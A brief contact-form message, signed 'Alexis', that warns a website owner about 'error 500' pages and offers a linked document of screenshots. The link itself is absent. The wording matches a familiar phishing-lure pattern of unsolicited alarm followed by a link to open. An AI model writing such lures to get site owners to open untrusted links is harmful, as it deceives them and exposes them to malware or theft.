message: Hi, I'm Alexis, I just noticed that there is the "error 500"
appearing on some of your website pages. I'm pretty positive that
those types of errors won't be appreciated by your customers and you
are basically losing money as a result, plus they can significantly
reduce the number of clicks from Google. I've decided to help and
created the document for you with a few screenshots of errors and also
indicated the links to the pages where they appear, hope it helps.
Here's the link to the doc, check it out:

Have a good day!
